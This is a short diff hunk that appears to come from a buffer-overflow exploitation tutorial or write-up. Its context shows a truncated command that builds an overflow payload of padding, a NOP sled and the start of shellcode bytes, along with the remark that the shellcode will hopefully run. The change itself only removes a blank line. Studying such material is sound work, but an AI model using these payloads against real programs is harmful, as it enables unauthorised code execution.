@@ -123,4 +123,3 @@ run $(python -c 'print "\x55" * (2060 - 256 - 95) + "\x90" * 256 + "\xd9\xc3\xba
 ```
 
 Now our shellcode will hopefully be run!
-
